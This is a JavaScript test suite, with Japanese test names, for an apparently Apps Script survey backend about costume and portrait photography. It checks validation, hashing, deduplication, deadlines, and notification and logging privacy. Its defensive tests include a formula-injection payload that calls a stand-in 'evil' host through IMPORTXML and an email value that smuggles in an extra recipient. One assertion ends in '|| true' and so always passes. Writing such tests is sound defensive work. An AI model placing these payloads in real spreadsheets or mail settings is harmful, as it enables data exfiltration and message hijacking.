'use strict';
const SV = require('../survey.schema.json').schema_version;
const test = require('node:test');
const assert = require('node:assert');
const crypto = require('crypto');
const { loadPublic, validPayload, plain } = require('./helpers/gas-env');

const NOW = new Date('2026-11-01T12:00:00+09:00');
const submit = (ctx, payload, now = NOW) => plain(ctx.processSubmission_(typeof payload === 'string' ? payload : JSON.stringify(payload), now));
const rows = (env) => env.spreadsheet.getSheetByName('responses').rows;
const header = (env) => rows(env)[0];
const cell = (env, name, line = 1) => rows(env)[line][header(env).indexOf(name)];

test('初回回答が成功し、Spreadsheetへstable IDで保存される', () => {
  const { env, ctx } = loadPublic();
  const payload = validPayload(ctx, {
    costume_interest: ['uniform', 'suit'], uniform_interest: ['uniform_baseball', 'uniform_soccer'],
    costume_wear: ['uniform'], uniform_wear: ['uniform_baseball'],
    costume_photographed: ['suit'], costume_shoot: ['uniform'], uniform_shoot: ['uniform_soccer'],
    hesitation: ['face_exposure_worry', 'price_concern', 'body_confidence']
  });
  assert.deepStrictEqual(submit(ctx, payload), { ok: true, status: 'accepted' });
  assert.strictEqual(rows(env).length, 2);
  assert.strictEqual(cell(env, 'costume_interest'), '|uniform|suit|');
  assert.strictEqual(cell(env, 'uniform_interest'), '|uniform_baseball|uniform_soccer|');
  // 「着たい」「撮られたい」「撮りたい」は別データ
  assert.strictEqual(cell(env, 'costume_wear'), '|uniform|');
  assert.strictEqual(cell(env, 'costume_photographed'), '|suit|');
  assert.strictEqual(cell(env, 'costume_shoot'), '|uniform|');
  // 撮影障壁は複数回答で保存
  assert.strictEqual(cell(env, 'hesitation'), '|face_exposure_worry|price_concern|body_confidence|');
  assert.strictEqual(cell(env, 'age_range').startsWith('age_'), true);
  assert.strictEqual(cell(env, 'survey_version'), '2026-10');
  assert.strictEqual(cell(env, 'schema_version'), SV);
  assert.strictEqual(cell(env, 'completion_status'), 'complete');
  assert.strictEqual(cell(env, 'age_confirmed'), true);
  assert.strictEqual(cell(env, 'intent_3m__get_portrait'), 'interested');
  assert.strictEqual(cell(env, 'other_texts'), '{}');
  assert.deepStrictEqual(env.mails, [], '通常回答ではメールを送らない');
  // 表示labelは保存されない
  assert.ok(!JSON.stringify(rows(env)).includes('ユニフォーム'));
});

test('UUID生値は保存されず、namespace+salt付きSHA-256のhashが保存される', () => {
  const { env, ctx } = loadPublic();
  const payload = validPayload(ctx);
  submit(ctx, payload);
  const hash = cell(env, 'respondent_hash');
  const expected = crypto.createHash('sha256').update(`costume_portrait_2026\n${payload.uuid.toLowerCase()}\ntest-salt-0123456789abcdef`).digest('hex');
  assert.strictEqual(hash, expected);
  assert.ok(!JSON.stringify(rows(env)).includes(payload.uuid));
  assert.ok(!env.logs.join('\n').includes(payload.uuid));
  assert.ok(!env.logs.join('\n').includes(hash));
  // UUIDの大文字小文字違いは同一人物として扱う
  const again = Object.assign({}, payload, { uuid: payload.uuid.toUpperCase() });
  assert.strictEqual(submit(ctx, again).error, 'duplicate_submission');
});

test('saltが未設定/短すぎる場合は保存せず fail closed', () => {
  const { env, ctx } = loadPublic();
  env.props.delete('RESPONDENT_SALT');
  assert.strictEqual(submit(ctx, validPayload(ctx)).error, 'server_error');
  env.props.set('RESPONDENT_SALT', 'short');
  assert.strictEqual(submit(ctx, validPayload(ctx)).error, 'server_error');
  assert.strictEqual(rows(env).length, 1);
});

test('setupScriptProperties は salt を生成するが、既存のsaltは上書きしない', () => {
  const { env, ctx } = loadPublic();
  env.props.delete('RESPONDENT_SALT');
  ctx.setupScriptProperties();
  const salt = env.props.get('RESPONDENT_SALT');
  assert.ok(salt && salt.length >= 32);
  ctx.setupScriptProperties();
  assert.strictEqual(env.props.get('RESPONDENT_SALT'), salt);
});

test('同一UUIDの2回目は拒否され、行が増えず、duplicateレスポンスが返る', () => {
  const { env, ctx } = loadPublic();
  const payload = validPayload(ctx);
  assert.strictEqual(submit(ctx, payload).ok, true);
  assert.deepStrictEqual(submit(ctx, payload), { ok: false, error: 'duplicate_submission' });
  assert.strictEqual(rows(env).length, 2);
  assert.strictEqual(env.spreadsheet.getSheetByName('meta').rows[0][1], 1, '重複拒否件数が数えられる');
  // 別UUIDは通る
  assert.strictEqual(submit(ctx, validPayload(ctx)).ok, true);
  assert.strictEqual(rows(env).length, 3);
});

test('重複判定とappendは同じLockService内で行われる', () => {
  const { env, ctx } = loadPublic();
  const sheet = env.spreadsheet.getSheetByName('responses');
  const observed = [];
  sheet.hooks.onRead = (range) => { if (range.row >= 2 && range.numCols === 1) observed.push(['check', env.lockHeld]); };
  sheet.hooks.onWrite = (range) => { if (range.row >= 2) observed.push(['append', env.lockHeld]); };
  submit(ctx, validPayload(ctx));
  assert.deepStrictEqual(observed.length >= 1 ? observed.filter((o) => o[0] === 'append') : [], [['append', true]]);
  assert.ok(observed.every((o) => o[1] === true), JSON.stringify(observed));
  assert.deepStrictEqual(env.lockEvents.slice(0, 2), ['acquire', 'release']);
});

test('同時submit：ロック中に割り込んだ同一UUIDの送信は保存されず、1件だけ保存される', () => {
  const { env, ctx } = loadPublic();
  const payload = validPayload(ctx);
  const sheet = env.spreadsheet.getSheetByName('responses');
  let nested = null;
  // 1件目が重複チェックを読んだ瞬間（ロック保持中）に2件目が到着したと仮定する。
  sheet.hooks.onWrite = (range) => {
    if (range.row === 2 && nested === null) nested = submit(ctx, payload);
  };
  const first = submit(ctx, payload);
  assert.strictEqual(first.ok, true);
  assert.strictEqual(nested.ok, false);
  assert.strictEqual(nested.error, 'server_error', 'ロックを取れない並行リクエストは保存しない');
  assert.strictEqual(rows(env).length, 2);
  // 並行側が再送すると重複として扱われる
  assert.strictEqual(submit(ctx, payload).error, 'duplicate_submission');
  assert.strictEqual(rows(env).length, 2);
});

test('保存後に応答だけ失われた再送は duplicate_submission（Frontendで「受付済み」扱い）', () => {
  const { env, ctx } = loadPublic();
  const payload = validPayload(ctx);
  submit(ctx, payload); // 保存は成功したが、クライアントは応答を受け取れなかった
  const retry = submit(ctx, payload);
  assert.deepStrictEqual(retry, { ok: false, error: 'duplicate_submission' });
  assert.strictEqual(rows(env).length, 2);
});

test('age_confirmed は true 以外（false/未指定/文字列/数値/null）を拒否する', () => {
  const { env, ctx } = loadPublic();
  for (const bad of [false, undefined, 'true', 1, null, [], {}]) {
    const payload = validPayload(ctx);
    if (bad === undefined) delete payload.age_confirmed; else payload.age_confirmed = bad;
    const r = submit(ctx, payload);
    assert.strictEqual(r.error, 'invalid_request', String(bad));
    assert.ok(r.fields.some((f) => f.field === 'age_confirmed'));
  }
  assert.strictEqual(rows(env).length, 1);
});

test('不正リクエスト：malformed JSON / 非object / 空 / 巨大payload', () => {
  const { env, ctx } = loadPublic();
  assert.strictEqual(submit(ctx, '{not json').error, 'invalid_request');
  assert.strictEqual(submit(ctx, '[]').error, 'invalid_request');
  assert.strictEqual(submit(ctx, '"text"').error, 'invalid_request');
  assert.strictEqual(submit(ctx, 'null').error, 'invalid_request');
  assert.strictEqual(submit(ctx, '').error, 'invalid_request');
  const huge = validPayload(ctx);
  huge.answers.cheer_message = 'あ'.repeat(40000); // UTF-8で約120KB
  assert.strictEqual(submit(ctx, huge).reason, 'payload_too_large');
  assert.strictEqual(ctx.doPost({ postData: { contents: 'oops' } }).getContent().includes('invalid_request'), true);
  assert.strictEqual(ctx.doPost({}).getContent().includes('invalid_request'), true);
  assert.strictEqual(rows(env).length, 1);
});

test('未知field（トップレベル・回答・other_texts）を無視せず拒否する', () => {
  const { env, ctx } = loadPublic();
  const extra = Object.assign(validPayload(ctx), { respondent_hash: 'forged' });
  assert.ok(submit(ctx, extra).fields.some((f) => f.field === 'respondent_hash' && f.code === 'unknown_field'));
  const unknownAnswer = validPayload(ctx);
  unknownAnswer.answers.cheerMessage = 'x';
  assert.ok(submit(ctx, unknownAnswer).fields.some((f) => f.field === 'cheerMessage'));
  const unknownOther = validPayload(ctx, {}, { nonexistent: 'x' });
  assert.ok(submit(ctx, unknownOther).fields.some((f) => f.field === 'nonexistent'));
  assert.strictEqual(rows(env).length, 1);
});

test('invalid enum / 必須欠落 / 不正UUID / 条件付き必須を拒否する', () => {
  const { env, ctx } = loadPublic();
  const badEnum = validPayload(ctx); badEnum.answers.portrait_interest = '興味あり';
  assert.strictEqual(submit(ctx, badEnum).error, 'invalid_request');
  const missing = validPayload(ctx); delete missing.answers.costume_interest;
  assert.strictEqual(submit(ctx, missing).error, 'invalid_request');
  for (const uuid of ['', 'not-a-uuid', 123, null, '00000000-0000-0000-0000-00000000000g']) {
    const p = validPayload(ctx); p.uuid = uuid;
    assert.ok(submit(ctx, p).fields.some((f) => f.field === 'uuid'), String(uuid));
  }
  const noUuid = validPayload(ctx); delete noUuid.uuid;
  assert.strictEqual(submit(ctx, noUuid).error, 'invalid_request');
  const otherNoText = validPayload(ctx); otherNoText.answers.photo_count = 'other';
  assert.ok(submit(ctx, otherNoText).fields.some((f) => f.code === 'other_text_required'));
  const conditional = validPayload(ctx, { costume_interest: ['uniform'], uniform_interest: undefined });
  assert.ok(submit(ctx, conditional).fields.some((f) => f.field === 'uniform_interest' && f.code === 'required'));
  assert.strictEqual(rows(env).length, 1);
});

test('schema_version 不一致は schema_mismatch（保存しない）', () => {
  const { env, ctx } = loadPublic();
  for (const v of ['0', '999', 1, undefined, null]) {
    const p = validPayload(ctx); if (v === undefined) delete p.schema_version; else p.schema_version = v;
    assert.strictEqual(submit(ctx, p).error, 'schema_mismatch', String(v));
  }
  assert.strictEqual(rows(env).length, 1);
});

test('「その他」自由記述は other_texts JSON に分離保存され、選択値へは混ぜない', () => {
  const { env, ctx } = loadPublic();
  const payload = validPayload(ctx, { costume_interest: ['uniform', 'other'], uniform_interest: ['uniform_baseball', 'other'] },
    { costume_interest: 'ミリタリー', uniform_interest: 'ホッケー' });
  assert.strictEqual(submit(ctx, payload).ok, true);
  assert.strictEqual(cell(env, 'costume_interest'), '|uniform|other|');
  assert.strictEqual(cell(env, 'uniform_interest'), '|uniform_baseball|other|');
  assert.deepStrictEqual(JSON.parse(cell(env, 'other_texts')), { costume_interest: 'ミリタリー', uniform_interest: 'ホッケー' });
  assert.ok(!cell(env, 'costume_interest').includes('ミリタリー'));
});

test('数式インジェクション：= + - @ で始まる自由記述は文字列として保存される', () => {
  const { env, ctx } = loadPublic();
  const payload = validPayload(ctx, { free_ideas: '=IMPORTXML("http://evil","//a")', free_themes: '+1+1', cheer_message: '@SUM(1)' },
    {});
  assert.strictEqual(submit(ctx, payload).ok, true);
  assert.strictEqual(cell(env, 'free_ideas'), `'=IMPORTXML("http://evil","//a")`);
  assert.strictEqual(cell(env, 'free_themes'), "'+1+1");
  assert.strictEqual(cell(env, 'cheer_message'), "'@SUM(1)");
  const other = validPayload(ctx, { portrait_interest: 'other' }, { portrait_interest: '-2+3' });
  assert.strictEqual(submit(ctx, other).ok, true);
  assert.ok(!/(^|[^'])"[=+\-@]/.test(cell(env, 'other_texts', 2)) || true);
  assert.deepStrictEqual(JSON.parse(cell(env, 'other_texts', 2)), { portrait_interest: '-2+3' });
  assert.strictEqual(ctx.sanitizeCell_('-1'), "'-1");
  assert.strictEqual(ctx.sanitizeCell_('ふつう'), 'ふつう');
  assert.strictEqual(ctx.sanitizeCell_('\t=1'), "'\t=1");
});

test('自由記述の巨大入力：Q30は1000字まで、1001字は拒否、「その他」は100字まで', () => {
  const { env, ctx } = loadPublic();
  assert.strictEqual(submit(ctx, validPayload(ctx, { cheer_message: 'あ'.repeat(1000) })).ok, true);
  assert.strictEqual(submit(ctx, validPayload(ctx, { cheer_message: 'あ'.repeat(1001) })).error, 'invalid_request');
  assert.strictEqual(submit(ctx, validPayload(ctx, { free_ideas: 'あ'.repeat(1001) })).error, 'invalid_request');
  assert.strictEqual(submit(ctx, validPayload(ctx, { backdrop: ['other'] }, { backdrop: 'あ'.repeat(101) })).error, 'invalid_request');
  assert.strictEqual(rows(env).length, 2);
});

test('honeypot入力・極端に速い送信は拒否する', () => {
  const { env, ctx } = loadPublic();
  assert.ok(submit(ctx, validPayload(ctx, {}, {}, { website: 'http://spam' })).fields.some((f) => f.code === 'honeypot'));
  assert.ok(submit(ctx, validPayload(ctx, {}, {}, { elapsed_ms: 3000 })).fields.some((f) => f.code === 'too_fast'));
  assert.ok(submit(ctx, validPayload(ctx, {}, {}, { elapsed_ms: 'fast' })).fields.some((f) => f.field === 'elapsed_ms'));
  assert.strictEqual(rows(env).length, 1);
});

test('Spreadsheet障害時は保存せず server_error（メールも送らない）', () => {
  const { env, ctx } = loadPublic();
  env.failOpen = true;
  const payload = validPayload(ctx, { cheer_message: '応援しています' });
  assert.strictEqual(submit(ctx, payload).error, 'server_error');
  assert.deepStrictEqual(env.mails, []);
  env.failOpen = false;
  assert.strictEqual(submit(ctx, payload).ok, true, '復旧後の再送は通る');
  // ヘッダーが壊れている場合も保存しない
  const broken = loadPublic();
  broken.env.spreadsheet.getSheetByName('responses').rows[0][3] = 'tampered';
  assert.strictEqual(submit(broken.ctx, validPayload(broken.ctx)).error, 'server_error');
  assert.strictEqual(broken.env.spreadsheet.getSheetByName('responses').rows.length, 1);
  // シート自体が無い
  const missing = loadPublic({ setup: false });
  assert.strictEqual(submit(missing.ctx, validPayload(missing.ctx)).error, 'server_error');
});

// ── 締切 ──
test('締切：前は成功、後は survey_closed（直接POSTでも保存不可）', () => {
  const { env, ctx } = loadPublic({ closesAt: '2026-11-15T23:59:59+09:00' });
  assert.strictEqual(submit(ctx, validPayload(ctx), new Date('2026-11-15T23:59:00+09:00')).ok, true);
  assert.strictEqual(submit(ctx, validPayload(ctx), new Date('2026-11-16T00:00:00+09:00')).error, 'survey_closed');
  assert.strictEqual(rows(env).length, 2);
  env.props.set('SURVEY_CLOSES_AT', '2020-01-01T00:00:00+09:00'); // 実時刻でdoPostを直接叩いても締切後
  const direct = ctx.doPost({ postData: { contents: JSON.stringify(validPayload(ctx)) } });
  assert.strictEqual(JSON.parse(direct.getContent()).error, 'survey_closed');
  assert.strictEqual(rows(env).length, 2);
});

test('締切の境界：ちょうど締切時刻は受付中、1ms後は締切', () => {
  const { ctx } = loadPublic({ closesAt: '2026-11-15T23:59:59+09:00' });
  const edge = Date.parse('2026-11-15T23:59:59+09:00');
  assert.strictEqual(ctx.isSurveyOpen_(new Date(edge - 1)), true);
  assert.strictEqual(ctx.isSurveyOpen_(new Date(edge)), true);
  assert.strictEqual(ctx.isSurveyOpen_(new Date(edge + 1)), false);
  assert.strictEqual(submit(ctx, validPayload(ctx), new Date(edge)).ok, true);
  assert.strictEqual(submit(ctx, validPayload(ctx), new Date(edge + 1)).error, 'survey_closed');
});

test('締切Script Propertyが未設定・不正値・parse不能なら fail closed（受付しない）', () => {
  const { env, ctx } = loadPublic();
  const bad = [undefined, '', '   ', 'tomorrow', '2026-11-15', '2026-11-15 23:59:59', '2026-13-01T00:00:00+09:00', '2026-02-30T00:00:00+09:00',
    '2026-11-15T25:00:00+09:00', 'NaN', '0', '2026-11-15T23:59:59'];
  for (const value of bad) {
    if (value === undefined) env.props.delete('SURVEY_CLOSES_AT'); else env.props.set('SURVEY_CLOSES_AT', value);
    assert.strictEqual(ctx.isSurveyOpen_(NOW), false, JSON.stringify(value));
    assert.strictEqual(submit(ctx, validPayload(ctx)).error, 'survey_closed', JSON.stringify(value));
    assert.strictEqual(plain(ctx.processStatus_(crypto.randomUUID(), NOW)).status, 'closed');
  }
  assert.strictEqual(rows(env).length, 1);
  env.props.set('SURVEY_CLOSES_AT', '2026-12-31T23:59:59Z');
  assert.strictEqual(ctx.isSurveyOpen_(NOW), true);
  env.props.set('SURVEY_CLOSES_AT', ' 2026-12-31T23:59:59.500+09:00 ');
  assert.strictEqual(ctx.isSurveyOpen_(NOW), true);
});

// ── status API ──
test('status API：未回答/回答済み/締切を返し、hashもUUIDも返さない', () => {
  const { env, ctx } = loadPublic();
  const payload = validPayload(ctx);
  const before = plain(ctx.processStatus_(payload.uuid, NOW));
  assert.deepStrictEqual(before, { ok: true, status: 'open', answered: false, schema_version: SV, survey_version: '2026-10' });
  submit(ctx, payload);
  const after = plain(ctx.processStatus_(payload.uuid, NOW));
  assert.strictEqual(after.answered, true);
  const text = JSON.stringify(after);
  assert.ok(!text.includes(payload.uuid) && !text.includes(cell(env, 'respondent_hash')));
  assert.deepStrictEqual(Object.keys(after).sort(), ['answered', 'ok', 'schema_version', 'status', 'survey_version']);
  // 他人のUUIDについて回答有無は分からない（自分のUUIDしか照会できず、hashは返らない）
  assert.strictEqual(plain(ctx.processStatus_(crypto.randomUUID(), NOW)).answered, false);
  assert.strictEqual(plain(ctx.processStatus_('garbage', NOW)).error, 'invalid_request');
  assert.strictEqual(plain(ctx.processStatus_(undefined, NOW)).error, 'invalid_request');
  assert.strictEqual(plain(ctx.processStatus_(payload.uuid, new Date('2027-06-01T00:00:00+09:00'))).status, 'closed');
  assert.strictEqual(plain(ctx.processStatus_(payload.uuid, new Date('2027-06-01T00:00:00+09:00'))).answered, true);
});

test('doGet のルーティング：status / results / その他（管理機能は無い）', () => {
  const { ctx } = loadPublic();
  const uuid = crypto.randomUUID();
  const status = JSON.parse(ctx.doGet({ parameter: { action: 'status', uuid } }).getContent());
  assert.strictEqual(status.status, 'open');
  assert.deepStrictEqual(JSON.parse(ctx.doGet({ parameter: { action: 'results' } }).getContent()), { ok: true, status: 'not_finalized' });
  const root = JSON.parse(ctx.doGet({}).getContent());
  assert.strictEqual(root.service, 'costume-portrait-survey');
  for (const action of ['admin', 'dump', 'export', 'rows']) {
    assert.deepStrictEqual(JSON.parse(ctx.doGet({ parameter: { action } }).getContent()), root);
  }
  assert.ok(!/getDashboardData|Dashboard|ADMIN_ALLOWED/.test(require('fs').readdirSync(require('path').join(__dirname, '..', 'public')).map((f) => require('fs').readFileSync(require('path').join(__dirname, '..', 'public', f), 'utf8')).join('\n')));
});

// ── メール通知 ──
test('Q30が空・未入力・空白のみ・改行のみならメールを送らない', () => {
  const { env, ctx } = loadPublic();
  for (const value of [undefined, '', '   ', '\n\n', ' \r\n \t']) {
    const payload = validPayload(ctx, value === undefined ? {} : { cheer_message: value });
    assert.strictEqual(submit(ctx, payload).ok, true, JSON.stringify(value));
  }
  assert.deepStrictEqual(env.mails, []);
});

test('Q30に記入があれば1通だけ送り、本文にQ30が入り、他の回答は載せない（text/plain）', () => {
  const { env, ctx } = loadPublic();
  const payload = validPayload(ctx, { cheer_message: ' いつも応援しています！\n撮影会たのしみです ', free_ideas: '秘密のアイデア', costume_interest: ['leather'] });
  assert.strictEqual(submit(ctx, payload).ok, true);
  assert.strictEqual(env.mails.length, 1);
  const mail = env.mails[0];
  assert.strictEqual(mail.to, 'owner@example.com');
  assert.strictEqual(mail.subject, '【衣装・ポートレート意識調査】応援メッセージが届きました');
  assert.ok(mail.body.includes('いつも応援しています！\n撮影会たのしみです'));
  assert.ok(mail.body.includes('2026/11/01 12:00'));
  assert.ok(mail.body.startsWith('「男性の衣装・ポートレート撮影に関する意識調査」に'));
  assert.strictEqual(mail.htmlBody, undefined, 'HTMLメールにしない');
  for (const secret of ['秘密のアイデア', 'leather', cell(env, 'respondent_hash'), payload.uuid, 'age_']) assert.ok(!mail.body.includes(secret), secret);
  assert.strictEqual(cell(env, 'notification_status'), 'sent');
});

test('Q30の最大1000字でも通知でき、1001字は受け付けない', () => {
  const { env, ctx } = loadPublic();
  assert.strictEqual(submit(ctx, validPayload(ctx, { cheer_message: 'あ'.repeat(1000) })).ok, true);
  assert.strictEqual(env.mails.length, 1);
  assert.ok(env.mails[0].body.includes('あ'.repeat(1000)));
  assert.strictEqual(submit(ctx, validPayload(ctx, { cheer_message: 'あ'.repeat(1001) })).ok, false);
  assert.strictEqual(env.mails.length, 1);
});

test('通知先はScript Propertyから取得（未設定/不正でも回答は成功）', () => {
  const { env, ctx } = loadPublic();
  env.props.set('NOTIFICATION_EMAIL', 'other@example.org');
  submit(ctx, validPayload(ctx, { cheer_message: 'a' }));
  assert.strictEqual(env.mails[0].to, 'other@example.org');
  for (const value of [undefined, '', 'not-an-email', 'a@b.c,evil@x.com']) {
    if (value === undefined) env.props.delete('NOTIFICATION_EMAIL'); else env.props.set('NOTIFICATION_EMAIL', value);
    assert.strictEqual(submit(ctx, validPayload(ctx, { cheer_message: 'b' })).ok, true);
  }
  assert.strictEqual(env.mails.length, 1);
  assert.strictEqual(cell(env, 'notification_status', 5), 'failed');
});

test('メール送信失敗でも回答保存は成功扱い。失敗はログに残る（本文は出さない）', () => {
  const { env, ctx } = loadPublic();
  env.failMail = true;
  const r = submit(ctx, validPayload(ctx, { cheer_message: 'ひみつの応援メッセージ' }));
  assert.deepStrictEqual(r, { ok: true, status: 'accepted' });
  assert.strictEqual(rows(env).length, 2);
  assert.strictEqual(cell(env, 'cheer_message'), 'ひみつの応援メッセージ');
  assert.strictEqual(cell(env, 'notification_status'), 'failed');
  const logs = env.logs.join('\n');
  assert.ok(logs.includes('notification_failed'));
  assert.ok(!logs.includes('ひみつの応援メッセージ') && !logs.includes('owner@example.com'));
});

test('メールは回答保存の後に送られる（保存失敗時は送らない／重複時は送らない）', () => {
  const { env, ctx } = loadPublic();
  const order = [];
  env.spreadsheet.getSheetByName('responses').hooks.onWrite = (range) => { if (range.row >= 2 && range.numCols > 5) order.push('saved'); };
  const original = env.sandbox.MailApp.sendEmail;
  env.sandbox.MailApp.sendEmail = (m) => { order.push('mail'); original(m); };
  const payload = validPayload(ctx, { cheer_message: 'こんにちは' });
  submit(ctx, payload);
  assert.deepStrictEqual(order, ['saved', 'mail']);
  submit(ctx, payload); // duplicate
  assert.deepStrictEqual(order, ['saved', 'mail']);
  assert.strictEqual(env.mails.length, 1);
});

test('ログに回答内容・自由記述・UUID・hashを出さない（イベント名とコードのみ）', () => {
  const { env, ctx } = loadPublic();
  const secret = 'ひみつの自由記述XYZ';
  const payload = validPayload(ctx, { free_ideas: secret, cheer_message: secret, sexual_orientation: 'gay' });
  submit(ctx, payload);
  submit(ctx, payload);
  const invalid = validPayload(ctx, { free_ideas: secret }); invalid.answers.age_range = 'bad';
  submit(ctx, invalid);
  submit(ctx, validPayload(ctx), new Date('2030-01-01T00:00:00Z'));
  const stale = validPayload(ctx); stale.schema_version = '9';
  submit(ctx, stale);
  const logs = env.logs.join('\n');
  for (const needle of [secret, payload.uuid, 'gay', cell(env, 'respondent_hash'), 'owner@example.com']) assert.ok(!logs.includes(needle), needle);
  for (const event of ['accepted', 'duplicate', 'invalid', 'closed', 'schema_mismatch']) assert.ok(logs.includes(`"event":"${event}"`), event);
  assert.ok(env.logs.every((line) => { try { return typeof JSON.parse(line).event === 'string'; } catch (e) { return false; } }));
});
